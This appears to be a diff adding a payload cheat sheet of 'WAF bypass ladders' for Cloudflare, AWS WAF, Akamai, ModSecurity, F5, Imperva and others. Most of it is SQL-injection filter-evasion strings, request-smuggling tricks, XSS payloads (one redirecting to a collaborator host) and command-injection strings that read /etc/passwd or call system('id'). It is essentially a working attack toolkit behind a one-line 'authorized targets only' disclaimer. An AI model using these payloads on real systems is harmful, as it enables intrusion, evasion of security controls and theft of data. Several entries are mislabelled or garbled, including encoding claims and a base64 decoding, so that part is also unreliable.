@@ -1,0 +1,141 @@
+# ==================== PER-WAF PAYLOAD LADDERS (2026) ====================
+# One ladder per WAF. Each line is a SINGLE REPLACEABLE payload for the ### 
+# markers. Replace base payloads (7*7 / ' OR 1=1-- / id) as needed.
+# Authorized targets only. Start with universal-cheatsheet.txt for general rules.
+
+# ==================== CLOUDFLARE ====================
+# 1) Newline instead of space (classic CF gap):
+q=1'%0AOR%0A1=1--
+# 2) Tab as whitespace token:
+q=1'%09OR%091=1--
+# 3) JSON body (bypasses query-string rule set on some CF plans):
+POST /api {"q":"1' OR 1=1--"}
+# 4) Oversized POST body (append >1MB junk to trip CF and let nginx parse):
+POST /?q=1'OR+1=1--&pad=AAAA...(1MB)
+# 5) Convert to UTF-16/UTF-7 to dodge keyword scans:
+q=%2B%2B1'%20OR%201=1--
+# 6) Path var trick: /index.php?x[]=1'OR+1=1--
+# 7) Cloudflare only inspects first request in a connection pool - reuse keep-alive after a benign first GET.
+
+# ==================== AWS WAF ====================
+# 1) Newline-delimited operators:
+q=1'%0aor%0a1=1--
+# 2) Comments as splitters (AWS regex hates / *):
+q=1'%2f*a%2fOR%2f*b%2f1=1--
+# 3) Case mixing:
+q=1'%20oR%201=1--
+# 4) Multipart/form-data (rule-set usually skips multipart):
+POST / Content-Type: multipart/form-data; boundary=----waf
+------waf
+Content-Disposition: form-data; name="q"
+
+1' OR 1=1--
+------waf--
+# 5) Base64 params: ?x=MWoncG9yZzJkLmkxPXQ ('1'or 2d.i1=t)
+# 6) Trailing null byte tokens: 1'%00OR%001=1--
+
+# ==================== AKAMAI ====================
+# 1) Unicode padding characters around keywords:
+q=1'%20U%CC%B6NION%20SELECT%201--
+# 2) Header case / odd-whitespace: X-Forwarded-For value tricks:
+q=1'%20UN%00ION%20SELECT%201--
+# 3) Non-ASCII separators (€ as whitespace):
+q=1'€UNION€SELECT€1--
+# 4) Comment fence inside keyword:
+q=1'%%27%20UN/**/ION%20SE/**/LECT-- h
+# 5) Tab-separated operators (Akamai's regex excludes \t):
+q=1'\tOR\t1=1--
+
+# ==================== MODSECURITY / OWASP CRS ====================
+# 1) %u (Windows universal) encoding:
+q=1%u0027%u0020OR%u00201=1--
+# 2) Tab in operator + comment fence:
+q=1'%09OR%09/**/1=1--
+# 3) Versioned MySQL comments:
+q=1'/*!50000OR*/1=1--
+# 4) Null byte + lowercase (CRS3 ph2 lowercases, then)\
+q=1'%00or%001=1--
+# 5) CRS misses operators when inside single-quoted context without space:
+q=1'OR(1)=1--   and   q=1'||1=1||'
+
+# ==================== F5 BIG-IP / ASM ====================
+# 1) Unicode overlong encodings:
+q=1%c0%a7%20OR%201=1--  (overlong for ')
+# 2) TE: chunked smuggling (F5 vs back-end PHP often differ):
+POST /; chuncked TE persists
+# 3) Body noise: append random trailing garbage after a valid content-length (F5 parses first CL, nginx last).
+# 4) Double URL encoding (F5 decodes once, app twice):
+q=1%2527%2520OR%25201=1--
+
+# ==================== IMPERVA ====================
+# 1) % and ; separators:
+q=1'&apos;%3bOR%3b1=1--
+# 2) Fragment '#': forces operator payload no space classifiers: 1'#OR#1=1
+# 3) Mixed-case + AS style (Imperva's regex is char-order-sensitive):
+q=1'%20aND%201=1--
+# 4) Non-ASCII space padding (%0a%0d%00):
+q=1'%0aOR%0a1=1--%00
+
+# ==================== SUCURI ====================
+# 1) Base64 in query values (Sucuri only decodes some):
+?x=MSdvciAxPTEtLQ%3D%3D            # base64("1'or 1=1--")
+# 2) Hex-encoded path:  /index.ph%70?x=1'OR+1=1--
+# 3) Semicolon param injection: /?q=1';q=OR+1=1--
+# 4) Null byte in keyword: 1'%00OR%001=1
+
+# ==================== FASTLY ====================
+# 1) Fragment separator that usually passes:
+q=1'#OR#1=1--
+# 2) Case mixing + %0a:
+q=1'%0AORDER%0ABY%0ACNU--+
+# 3) Overlong %0a%0d after operator (Fastly often decodes twice):
+q=1'%0a%0dOR%0a%0d1=1--
+
+# ==================== RADWARE / FORTIWEB / BARRAUD (minor, inc. F5-BIG) ====================
+# F5-BIG-IP & Barraud accept mixed-case + non-ASCII whitespace:
+q=1'€OR€1=1--
+# FortiWeb often pass `CONVERT`+  versioned comment:
+q=1'/*!00000OR*/1=1--
+
+# ==================== XSS-SPECIFIC LADDERS (any WAF) ====================
+<script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<IMG SRC='javascript:alert(1)'>
+<svg><script>alert(1)</script>
+<img src=x οnerror=alert(1)> # (greek o, byte-level bypass)
+%3Cscript%3Ealert(1)%3C/script%3E
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<a href="javas&#x63;ript:alert(1)">x</a>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<svg/onload=alert`1`>
+javascript:alert(1)   ->   javascript&#58;alert(1)  ->  &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:
+<svg onload=locati&#x6f;n=&#x2f;&#x2f;YOUR-COLLABORATOR.com>
+<svg onload=document.body.innerHTML+=`<!--`>
+
+# ==================== CMD-INJECTION SPECIFIC LADDERS ====================
+id
+`id`
+$(id)
+|id
+||id
+& id
+;id
+%0aid
+%0aid%0a
+c'at' /etc/passwd
+c"at" /etc/passwd
+cat${IFS}/etc/passwd
+c\at /etc/passwd
+{cat,/etc/passwd}
+a=i;d=id;$a$d
+/???/??? ???/????
+$(printf 'i\x64')            # eval-built
+%${IFS}id
+wh$(echo oami)
+# ugly-token payloads (Mixer/waf):
+; NoP  |  ; id&p  |  ; 'id'  |  ; $({ /no/such/path; })  |  ; <(id)  |  ; /dev/d"i"v
+# For PHP apps, semicolon-in-parameter:
+?cmd=;system('id');
+?cmd=;sys%74em('id');
